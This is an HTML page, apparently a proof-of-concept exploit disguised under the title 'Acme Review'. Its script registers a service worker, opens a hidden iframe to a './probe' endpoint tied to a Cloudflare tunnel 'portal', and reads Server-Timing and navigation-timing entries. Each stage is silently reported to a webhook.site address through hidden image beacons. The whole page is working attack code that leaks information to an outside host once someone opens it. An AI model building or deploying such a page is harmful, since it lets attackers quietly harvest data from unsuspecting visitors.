
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>Acme Review</title>
</head>
<body>
  <h2>Acme Review</h2>
  <pre id="result">Starting...</pre>

  <script>
    const PORTAL =
      "https://originally-yours-respondents-combined.trycloudflare.com";

    const HOOK =
      "https://webhook.site/ecf90bba-d52e-4352-b2d5-3b81ce45a357";

    const output = document.getElementById("result");

    function log(stage, data = {}) {
      const report = {
        stage,
        data,
        userAgent: navigator.userAgent
      };

      output.textContent +=
        "\n" + JSON.stringify(report, null, 2);

      console.log(report);

      // 실행 결과를 Webhook.site에서 확인
      const img = new Image();
      img.style.display = "none";
      img.src =
        HOOK +
        "?event=" + encodeURIComponent(stage) +
        "&data=" + encodeURIComponent(
          JSON.stringify(report).slice(0, 1500)
        ) +
        "&t=" + Date.now();

      document.body.appendChild(img);
    }

    async function main() {
      log("page-opened");

      try {
        await navigator.serviceWorker.register(
          "./sw.js?v=5",
          { updateViaCache: "none" }
        );

        await navigator.serviceWorker.ready;

        if (!navigator.serviceWorker.controller) {
          location.reload();
          return;
        }

        log("sw-ready");

        const frame = document.createElement("iframe");
        frame.style.display = "none";

        frame.onload = () => {
          log("frame-loaded");

          // 부모 문서의 리소스 성능 정보
          const resources =
            performance.getEntriesByType("resource")
              .filter(e => e.name.includes("/probe"));

          log("parent-timing", resources.map(e => ({
            name: e.name,
            serverTiming: e.serverTiming
          })));

          // iframe 문서의 Navigation Timing 정보
          try {
            const nav =
              frame.contentWindow.performance
                .getEntriesByType("navigation")[0];

            log("navigation-timing", {
              name: nav?.name,
              serverTiming: (nav?.serverTiming || [])
                .map(t => ({
                  name: t.name,
                  description: t.description,
                  duration: t.duration
                }))
            });
          } catch (error) {
            log("navigation-error", {
              message: error.message
            });
          }
        };

        frame.onerror = () => {
          log("frame-error");
        };

        frame.src =
          "./probe?portal=" +
          encodeURIComponent(PORTAL) +
          "&t=" + Date.now();

        document.body.appendChild(frame);

        log("probe-started");

      } catch (error) {
        log("main-error", {
          message: error.message
        });
      }
    }

    main();
  </script>
</body>
</html>
